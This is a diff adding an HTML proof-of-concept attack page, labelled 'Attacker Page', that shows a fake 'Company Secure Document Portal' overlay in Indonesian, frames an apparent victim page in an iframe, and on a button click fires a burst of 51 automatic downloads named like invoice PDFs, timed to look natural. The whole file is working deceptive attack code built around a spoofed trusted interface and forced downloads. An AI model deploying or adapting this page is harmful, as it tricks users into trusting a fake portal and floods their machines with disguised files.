@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Document Portal</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #overlay button {
+            padding: 12px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        iframe {
+            margin-top: 20px;
+            border: 2px solid red;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Fake trusted UI -->
+<div id="overlay">
+    <h2>Company Secure Document Portal</h2>
+    <p>Download dokumen penting Anda.</p>
+    <button onclick="startAttack()">Download Sekarang</button>
+</div>
+
+<h1>Attacker Page (localhost:8787)</h1>
+
+<!-- Victim iframe -->
+<iframe src="http://cnfdnfial-ops.github.io/spoof/victims.html" width="400" height="200"></iframe>
+
+<script>
+    function triggerDownloads() {
+        console.log('[*] Triggering multiple downloads...');
+
+        for (let i = 0; i < 51; i++) {
+            setTimeout(() => {
+                const a = document.createElement('a');
+
+                a.href = 'data:text/plain;charset=utf-8,Confidential Document ' + i;
+
+                // File dibuat realistis
+                a.download = 'Invoice_2026_' + i + '.pdf';
+
+                a.style.display = 'none';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+
+            }, i * 60); // delay natural
+        }
+
+        console.log('[*] Download burst completed.');
+    }
+
+    function startAttack() {
+        document.getElementById('overlay').innerHTML = "<h3>Memproses permintaan...</h3>";
+
+        // Delay biar realistis
+        setTimeout(() => {
+            triggerDownloads();
+        }, 1200);
+    }
+</script>
+
+</body>
+</html>
